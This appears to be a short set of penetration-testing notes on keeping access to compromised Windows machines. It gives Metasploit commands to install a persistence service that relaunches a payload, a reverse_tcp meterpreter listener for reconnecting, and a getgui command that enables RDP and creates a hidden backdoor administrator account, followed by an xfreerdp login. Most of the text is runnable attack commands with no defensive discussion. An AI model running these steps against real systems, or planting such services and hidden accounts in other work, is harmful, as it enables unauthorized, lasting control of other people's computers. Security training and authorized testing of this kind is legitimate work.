## Windows Persistence

Persistence is needed to keep access to the target after the vulnerability is patched, password are changed, system is shut down, the connection is lost etc. so you dont have to go thru the whole process of penetration again.

**Techniques:**

**1.Persistence via services** 

**2.Persistence Via RDP (Create Account Technique)**

**Persistence Viar Services**

On msfconsole, after gaining Administrator Privileges, put current session in the background and search for “persistence\_service”. This will generate and upload an executable to the target system and make it a persistence service(it will run in the background).The will create a new service which will start the payload whenever the service is running.

```plaintext
search persistence_service
use 0
show options
set LPORT 4443
sessions
set SESSION 1
exploit
```

If we terminate the session on the target system, we can reconnect by following this steps:

```plaintext
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST
set LPORT 4443
exploit
```
### **2.Persistence Via RDP** 

The goal is to create a backdoor user account and add it to the local administrator group.

from meterpreter session

The following command will check if RDP service is enable, enable it if it isn't, create a new user, hide the user from the login screen, add user to the RDP users group, and add user to the local administrators group.

```plaintext
run getgui -e -u kaliburn -p my_new_password
```

Now we can  connect to the target system

```plaintext
xfreerdp /:kaliburn /p:my_new_password 10.10.10.10
```


